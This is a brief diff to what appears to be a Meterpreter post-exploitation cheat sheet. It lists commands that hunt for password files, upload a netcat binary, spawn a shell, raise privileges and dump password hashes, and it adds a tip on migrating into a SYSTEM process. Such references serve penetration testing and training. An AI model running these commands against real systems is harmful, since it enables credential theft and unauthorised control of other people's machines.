@@ -969,7 +969,7 @@ meterpreter > background
 meterpreter > search -f *pass*.txt
 meterpreter > upload /usr/share/windows-binaries/nc.exe c:\\Users\\Public
 meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
-meterpreter > shell
+meterpreter > shell        # if you cannot spawn a shell, migrate into another process running as SYSTEM
 meterpreter > getprivs
 meterpreter > use priv
 meterpreter > hashdump
